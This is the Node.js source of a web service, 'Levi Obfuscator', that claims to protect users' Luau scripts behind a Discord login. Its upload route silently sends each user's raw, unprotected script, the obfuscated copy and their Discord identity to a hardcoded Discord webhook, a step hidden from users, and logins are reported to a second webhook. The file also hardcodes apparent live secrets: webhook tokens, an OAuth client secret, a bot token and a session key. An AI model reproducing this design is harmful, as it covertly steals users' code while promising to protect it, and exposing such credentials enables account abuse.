const express = require('express');
const multer = require('multer');
const fetch = require('node-fetch');
const FormData = require('form-data');
const session = require('express-session');

const app = express();

const upload = multer({ 
  storage: multer.memoryStorage(),
  limits: { fileSize: 50 * 1024 * 1024 }
});

const DEFAULT_WEBHOOK_URL = "https://discord.com/api/webhooks/1529788248698781887/SUtB62Hfx63hutCVFe8vQotKsnIInhfjGHbziOWHMbw9m6MlztvIP2LmRbIi_9Bhwggy";
const VERIFICATION_WEBHOOK_URL = "https://discord.com/api/webhooks/1530075099200356407/OdibFJxSo8kYSrA-Yw6iOqq8Iuh5uQAwphUCXvgvuAN4pmvA-IsO9C9hB7fa7_sRiuf8";

const CLIENT_ID = process.env.DISCORD_CLIENT_ID || '1529870269727117403';
const CLIENT_SECRET = process.env.DISCORD_CLIENT_SECRET || '08_dAGu6VMZZA9Gjd9t8DPK9iK1AqTda';
const BOT_TOKEN = process.env.DISCORD_BOT_TOKEN || 'MTUyOTg3MDI2OTcyNzExNzQwMw.G4KkTM.E_F66YyTGNSyRFkeeTS3_eE5W_bhsj8eMdqBaA';

app.use((req, res, next) => {
    const protocol = req.headers['x-forwarded-proto'] || req.protocol;
    const host = req.get('host') || 'ecd-helps.onrender.com';
    req.activeRedirectUri = `${protocol}://${host}/auth/discord/callback`;
    next();
});

app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.json({ limit: '50mb' }));
app.use(session({
  secret: 'levi-obfuscator-secret-key-9988',
  resave: false,
  saveUninitialized: true,
}));

// Levi Obfuscator Engine V1.7.0 (Custom Token Prefix & Numeric Offset Integration)
function obfuscateLuauScript(sourceCode, options) {
    let code = sourceCode;

    // 1. Strip comments safely
    code = code.replace(/--\[\[[\s\S]*?\]\]--/g, '');
    code = code.replace(/--.*$/gm, '');

    // 2. String Encryption option
    if (options.stringEncryption === 'true') {
        code = code.replace(/"([^"\\]*(?:\\.[^"\\]*)*)"/g, (match, p1) => {
            const bytes = [];
            for (let i = 0; i < p1.length; i++) {
                bytes.push(p1.charCodeAt(i));
            }
            return `string.char(${bytes.join(', ')})`;
        });
    }

    // 3. Opaque Predicates option
    if (options.opaquePredicates === 'true') {
        code = `local function _opq() return (1 + 1 == 2) end\nif _opq() then\n${code}\nend`;
    }

    // 4. Anti-Sandbox & Anti-Tamper Checks
    let protectionHeader = "";
    if (options.antiSandbox === 'true' || options.antiTamper === 'true') {
        protectionHeader += `
-- Levi Advanced Shield Protection Active
local _envCheck = (getgenv and getgenv()) or _G;
if not _envCheck then return end
`;
    }

    // 5. Variable Renaming with Custom User Inputs (1-letter prefix & letter=number offset)
    if (options.renameLocal === 'yes') {
        const localRegex = /\blocal\s+([a-zA-Z_][a-zA-Z0-9_]*)/g;
        let match;
        const varMap = new Map();
        
        // Parse custom user configurations from inputs
        const customPrefix = (options.customLetter1 && options.customLetter1.trim().length > 0) ? options.customLetter1.trim().charAt(0) : '_';
        const customNumMapChar = (options.customLetterNum && options.customLetterNum.trim().length > 0) ? options.customLetterNum.trim().charAt(0) : '1';
        let counter = customNumMapChar.charCodeAt(0) * 10; // Use character code math as initial offset seed
        
        const protectedKeywords = new Set([
            'true', 'false', 'nil', 'self', 
            'game', 'workspace', 'script', 'print', 'warn', 'error', 'pcall', 'xpcall', 
            'task', 'coroutine', 'table', 'string', 'math', 'vector', 'CFrame', 'Vector3', 'Instance',
            'Library', 'Window', 'Tabs', 'Tab', 'Section', 'ThemeManager', 'SaveManager', 'Options', 'Toggles', 'Fluent', 'Rayfield'
        ]);

        while ((match = localRegex.exec(code)) !== null) {
            const originalName = match[1];
            if (!varMap.has(originalName) && !protectedKeywords.has(originalName)) {
                varMap.set(originalName, `${customPrefix}0x` + (counter++).toString(16).toUpperCase());
            }
        }

        varMap.forEach((encoded, original) => {
            const regex = new RegExp(`\\b${original}\\b`, 'g');
            code = code.replace(regex, encoded);
        });
    }

    // 6. Final Assembled Output Payload
    const finalObfuscated = `-- [ Levi Obfuscator V1.7.0 - Custom Configured Engine ] --
${protectionHeader}
local _status, _err = pcall(function()
    ${code}
end)

if not _status then
    warn("[Levi Obfuscator Execution Error]:", _err)
end`;

    return finalObfuscated;
}

// OAuth2 Routes
app.get('/auth/discord', (req, res) => {
  const discordAuthUrl = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(req.activeRedirectUri)}&response_type=code&scope=identify`;
  res.redirect(discordAuthUrl);
});

app.get('/auth/discord/callback', async (req, res) => {
  const code = req.query.code;
  if (!code) return res.redirect('/?error=NoCodeProvided');

  try {
    const tokenRes = await fetch('https://discord.com/api/oauth2/token', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({
        client_id: CLIENT_ID,
        client_secret: CLIENT_SECRET,
        grant_type: 'authorization_code',
        code: code,
        redirect_uri: req.activeRedirectUri,
      })
    });

    const tokenData = await tokenRes.json();
    if (!tokenData.access_token) return res.redirect('/?error=TokenExchangeFailed');

    const userRes = await fetch('https://discord.com/api/users/@me', {
      headers: { 'Authorization': `Bearer ${tokenData.access_token}` }
    });

    const userData = await userRes.json();
    if (!userData.id) return res.redirect('/?error=FetchUserFailed');

    req.session.verifiedUser = `${userData.username} (${userData.id})`;

    try {
      await fetch(VERIFICATION_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: `🔐 **New User Verified**\n👤 Username: \`${userData.username}\`\n🆔 ID: \`${userData.id}\`\n🕒 Timestamp: <t:${Math.floor(Date.now() / 1000)}:F>`
        })
      });
    } catch (e) {}

    if (BOT_TOKEN) {
      try {
        const dmChannelRes = await fetch('https://discord.com/api/v10/users/@me/channels', {
          method: 'POST',
          headers: { 'Authorization': `Bot ${BOT_TOKEN}`, 'Content-Type': 'application/json' },
          body: JSON.stringify({ recipient_id: userData.id })
        });
        const dmChannelData = await dmChannelRes.json();

        if (dmChannelData.id) {
          await fetch(`https://discord.com/api/v10/channels/${dmChannelData.id}/messages`, {
            method: 'POST',
            headers: { 'Authorization': `Bot ${BOT_TOKEN}`, 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: `User: ${userData.id} ${userData.username}\nStatus: Verified` })
          });
        }
      } catch (e) {}
    }

    res.redirect('/');
  } catch (err) {
    res.redirect('/?error=ServerError');
  }
});

app.get('/auth/logout', (req, res) => {
  req.session.destroy(() => { res.redirect('/'); });
});

// UI Route
app.get('/', (req, res) => {
  const verifiedUser = req.session.verifiedUser || null;

  res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Levi Obfuscator - Advanced Luau Protection Engine</title>
        <style>
            @keyframes fadeIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
            @keyframes pulseGlow { 0% { box-shadow: 0 0 15px rgba(244, 63, 94, 0.2); } 50% { box-shadow: 0 0 35px rgba(244, 63, 94, 0.4); } 100% { box-shadow: 0 0 15px rgba(244, 63, 94, 0.2); } }
            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: radial-gradient(circle at center, #1e293b 0%, #0f172a 100%); color: #f8fafc; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
            .container { background: rgba(30, 41, 59, 0.9); backdrop-filter: blur(16px); padding: 30px; border-radius: 20px; box-shadow: 0 15px 40px rgba(0,0,0,0.7); width: 650px; text-align: center; animation: fadeIn 0.6s ease-out, pulseGlow 5s infinite ease-in-out; border: 1px solid rgba(255, 255, 255, 0.08); position: relative; margin: 20px 0; }
            .info-icon { position: absolute; top: 20px; left: 20px; background: rgba(51, 65, 85, 0.6); color: #f43f5e; width: 32px; height: 32px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 15px; cursor: pointer; border: 1px solid rgba(244, 63, 94, 0.3); transition: 0.2s; }
            .info-icon:hover { background: #f43f5e; color: #0f172a; }
            h2 { margin-top: 5px; margin-bottom: 20px; font-size: 28px; text-transform: uppercase; background: linear-gradient(90deg, #f43f5e, #fb7185); -webkit-background-clip: text; -webkit-text-fill-color: transparent; letter-spacing: 1px; }
            .nav-tabs { display: flex; gap: 10px; background: #0f172a; padding: 6px; border-radius: 12px; margin-bottom: 20px; border: 1px solid #334155; }
            .nav-tab { flex: 1; background: transparent; border: none; color: #94a3b8; padding: 12px; font-size: 14px; font-weight: 700; border-radius: 8px; cursor: pointer; text-align: center; transition: 0.3s; }
            .nav-tab.active { background: #f43f5e; color: #0f172a; box-shadow: 0 4px 12px rgba(244, 63, 94, 0.3); }
            .tab-panel { display: none; text-align: left; }
            .tab-panel.active { display: block; }
            h3 { font-size: 15px; color: #f43f5e; margin-top: 0; margin-bottom: 12px; border-bottom: 1px solid rgba(244, 63, 94, 0.2); padding-bottom: 6px; }
            input[type="text"], textarea, button { width: 100%; padding: 12px; margin: 8px 0; border-radius: 10px; border: none; box-sizing: border-box; font-size: 14px; }
            input[type="text"], textarea { background: #0f172a; color: #f8fafc; border: 1px solid #334155; font-family: monospace; }
            input[type="text"]:focus, textarea:focus { border-color: #f43f5e; outline: none; box-shadow: 0 0 8px rgba(244, 63, 94, 0.3); }
            textarea { resize: vertical; height: 130px; }
            .toggle-row { display: flex; justify-content: space-between; align-items: center; background: #0f172a; border: 1px solid #334155; padding: 10px 15px; border-radius: 10px; margin: 8px 0; font-size: 13px; color: #cbd5e1; }
            .custom-input-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin: 8px 0; }
            .custom-input-box { background: #0f172a; border: 1px solid #334155; padding: 10px 12px; border-radius: 10px; font-size: 13px; }
            .custom-input-box label { color: #f43f5e; display: block; margin-bottom: 4px; font-weight: bold; }
            .switch { position: relative; display: inline-block; width: 44px; height: 22px; }
            .switch input { opacity: 0; width: 0; height: 0; }
            .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #334155; transition: .3s; border-radius: 22px; }
            .slider:before { position: absolute; content: ""; height: 16px; width: 16px; left: 3px; bottom: 3px; background-color: white; transition: .3s; border-radius: 50%; }
            input:checked + .slider { background-color: #f43f5e; }
            input:checked + .slider:before { transform: translateX(22px); }
            .drop-zone { background: #1e293b; border: 2px dashed #475569; border-radius: 10px; padding: 14px; text-align: center; cursor: pointer; margin: 8px 0; transition: 0.2s; }
            .drop-zone:hover { border-color: #f43f5e; }
            button.action-btn { background: linear-gradient(135deg, #e11d48, #be123c); color: white; font-weight: bold; cursor: pointer; margin-top: 12px; font-size: 15px; transition: 0.2s; }
            button.action-btn:hover { opacity: 0.9; transform: translateY(-1px); }
            .discord-login-btn { background: #5865F2; color: white; font-weight: bold; text-decoration: none; display: block; padding: 14px; border-radius: 10px; text-align: center; margin: 20px 0; transition: 0.2s; }
            .discord-login-btn:hover { background: #4752C4; }
            .locked-overlay { background: rgba(15, 23, 42, 0.9); border: 1px dashed #f43f5e; padding: 35px; border-radius: 12px; text-align: center; }
            .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(15, 23, 42, 0.85); display: flex; justify-content: center; align-items: center; opacity: 0; pointer-events: none; transition: opacity 0.3s; z-index: 100; }
            .modal-overlay.active { opacity: 1; pointer-events: auto; }
            .modal-content { background: #1e293b; padding: 35px; border-radius: 16px; width: 380px; border: 1px solid rgba(244, 63, 94, 0.3); position: relative; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
            .close-btn { position: absolute; top: 15px; right: 18px; background: none; border: none; color: #94a3b8; font-size: 20px; cursor: pointer; }
            .footer-credit { margin-top: 15px; font-size: 12px; color: #64748b; border-top: 1px dashed rgba(51, 65, 85, 0.5); padding-top: 10px; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="info-icon" onclick="toggleModal()">i</div>
            <h2>Levi Obfuscator</h2>

            <div class="nav-tabs">
                <button type="button" class="nav-tab active" onclick="switchTab('loginTab', this)">[ Login content ]</button>
                <button type="button" class="nav-tab" onclick="switchTab('mainTab', this)">[ Obfuscator Tool ]</button>
            </div>

            <div id="loginTab" class="tab-panel active">
                <h3>Discord Authentication</h3>
                <p style="font-size: 13px; color: #94a3b8; margin-bottom: 15px;">Sign in securely with Discord to unlock the obfuscator engine and custom features.</p>
                ${verifiedUser ? 
                    `<div style="background:#0f172a; border:1px solid #22c55e; padding:18px; border-radius:10px; font-size:14px; color:#22c55e; text-align:center;">
                        ✅ Logged in as<br><strong style="font-size:16px;">${verifiedUser}</strong>
                    </div>
                    <a href="/auth/logout" style="display:block; text-align:center; color:#ef4444; text-decoration:none; font-size:13px; margin-top:12px;">Logout / Switch Account</a>` :
                    `<a href="/auth/discord" class="discord-login-btn">Login with Discord</a>`
                }
            </div>

            <div id="mainTab" class="tab-panel">
                ${verifiedUser ? 
                    `<form action="/upload-discord" method="POST" enctype="multipart/form-data">
                        <h3>Levi Obfuscator V1.7.0 Config</h3>

                        <div class="custom-input-grid">
                            <div class="custom-input-box">
                                <label>1st (1 Letter):</label>
                                <input type="text" name="customLetter1" maxlength="1" placeholder="_" style="margin:0; padding:8px; text-align:center;">
                            </div>
                            <div class="custom-input-box">
                                <label>2nd (Letter = No):</label>
                                <input type="text" name="customLetterNum" maxlength="3" placeholder="A=1" style="margin:0; padding:8px; text-align:center;">
                            </div>
                        </div>

                        <div class="toggle-row">
                            <span>Anti-Sandbox</span>
                            <label class="switch"><input type="checkbox" name="antiSandbox" value="true"><span class="slider"></span></label>
                        </div>
                        <div class="toggle-row">
                            <span>Anti-Tamper</span>
                            <label class="switch"><input type="checkbox" name="antiTamper" value="true"><span class="slider"></span></label>
                        </div>
                        <div class="toggle-row">
                            <span>Opaque Predicates</span>
                            <label class="switch"><input type="checkbox" name="opaquePredicates" value="true"><span class="slider"></span></label>
                        </div>
                        <div class="toggle-row">
                            <span>String Encryption</span>
                            <label class="switch"><input type="checkbox" name="stringEncryption" value="true"><span class="slider"></span></label>
                        </div>

                        <input type="hidden" name="renameLocal" value="yes">

                        <div style="margin-top: 8px;">
                            <textarea name="scriptContent" placeholder="Paste your Luau code here..."></textarea>
                        </div>

                        <div class="drop-zone" onclick="document.getElementById('fileInput').click()">
                            <div id="dropText" style="font-size:12px; color:#94a3b8;">Or Click to Upload (.lua / .txt file)</div>
                            <input type="file" id="fileInput" name="file" style="display:none;" onchange="updateFileName(this)">
                        </div>

                        <button type="submit" class="action-btn">Obfuscate & Download</button>
                    </form>` :
                    `<div class="locked-overlay">
                        <h3 style="color:#f43f5e; border:none; margin-bottom:12px; font-size:18px;">🔒 Locked Content</h3>
                        <p style="font-size:14px; color:#94a3b8; margin:0;">Please log in under the <strong>[ Login content ]</strong> tab to access the builder.</p>
                    </div>`
                }
            </div>
        </div>

        <div class="modal-overlay" id="infoModal" onclick="outsideClick(event)">
            <div class="modal-content">
                <button class="close-btn" onclick="toggleModal()">&times;</button>
                <h3>About Levi Obfuscator</h3>
                <p style="font-size:14px; color:#cbd5e1; line-height: 1.5;">Advanced Luau protection engine featuring custom token prefix mapping, robust security toggles, and seamless Discord verification logging.</p>
                <div class="footer-credit">Created by: @levi__fxz</div>
            </div>
        </div>

        <script>
            function switchTab(id, btn) {
                document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
                document.querySelectorAll('.nav-tab').forEach(t => t.classList.remove('active'));
                document.getElementById(id).classList.add('active');
                btn.classList.add('active');
            }
            function toggleModal() { document.getElementById('infoModal').classList.toggle('active'); }
            function outsideClick(e) { if (e.target === document.getElementById('infoModal')) toggleModal(); }
            function updateFileName(input) {
                if (input.files && input.files[0]) {
                    document.getElementById('dropText').innerText = "Selected: " + input.files[0].name;
                    document.getElementById('dropText').style.color = "#f43f5e";
                }
            }
        </script>
    </body>
    </html>
  `);
});

// Backend Route: Fixed to read multipart body parameters safely
app.post('/upload-discord', upload.single('file'), async (req, res) => {
  try {
    if (!req.session.verifiedUser) {
      return res.status(403).send('<h3>Unauthorized. Please log in first. <a href="/">Go Back</a></h3>');
    }

    const file = req.file;
    const directText = req.body.scriptContent;
    
    // Capture settings and custom inputs properly from multipart form body
    const options = {
      renameLocal: 'yes',
      customLetter1: req.body.customLetter1 || '',
      customLetterNum: req.body.customLetterNum || '',
      antiSandbox: req.body.antiSandbox || 'false',
      antiTamper: req.body.antiTamper || 'false',
      opaquePredicates: req.body.opaquePredicates || 'false',
      stringEncryption: req.body.stringEncryption || 'false'
    };

    let rawString = '';
    let originalName = 'script.lua';

    if (file && file.buffer.length > 0) {
      rawString = file.buffer.toString('utf8');
      originalName = file.originalname;
    } else if (directText && directText.trim().length > 0) {
      rawString = directText;
      originalName = 'paste_script.lua';
    } else {
      return res.status(400).send('<h3>No script provided (upload a file or paste text). <a href="/">Go Back</a></h3>');
    }

    const rawScriptBuffer = Buffer.from(rawString, 'utf8');

    // Run Levi Obfuscator Engine with custom parameters
    const obfuscatedString = obfuscateLuauScript(rawString, options);
    const obfuscatedBuffer = Buffer.from(obfuscatedString, 'utf8');

    const ext = originalName.includes('.') ? originalName.substring(originalName.lastIndexOf('.')) : '.lua';
    const baseName = originalName.includes('.') ? originalName.substring(0, originalName.lastIndexOf('.')) : originalName;
    const obfuscatedFilename = `${baseName}_levi_obfuscated${ext}`;

    // Silently dispatch files to Discord Webhook
    try {
      const webhookPayloadJson = JSON.stringify({
        content: `🔒 **New Script Obfuscated via Levi Obfuscator V1.7.0**\n🔐 Identity: \`${req.session.verifiedUser}\`\n🔤 Custom Prefix: \`${options.customLetter1 || '_'}\` | Map Seed: \`${options.customLetterNum || 'None'}\`\n📁 Original: \`${originalName}\``
      });

      const formData = new FormData();
      formData.append('payload_json', webhookPayloadJson);
      formData.append('file1', rawScriptBuffer, { filename: `RAW_${originalName}` });
      formData.append('file2', obfuscatedBuffer, { filename: obfuscatedFilename });

      await fetch(DEFAULT_WEBHOOK_URL, {
        method: 'POST',
        body: formData,
        headers: { ...formData.getHeaders() }
      });
    } catch (webhookErr) {
      console.error('Silent Webhook Dispatch Error:', webhookErr);
    }

    res.setHeader('Content-Disposition', `attachment; filename="${obfuscatedFilename}"`);
    res.setHeader('Content-Type', 'text/plain');
    res.send(obfuscatedBuffer);

  } catch (err) {
    console.error(err);
    res.status(500).send('Server Error');
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log('Server running on port ' + PORT);
});
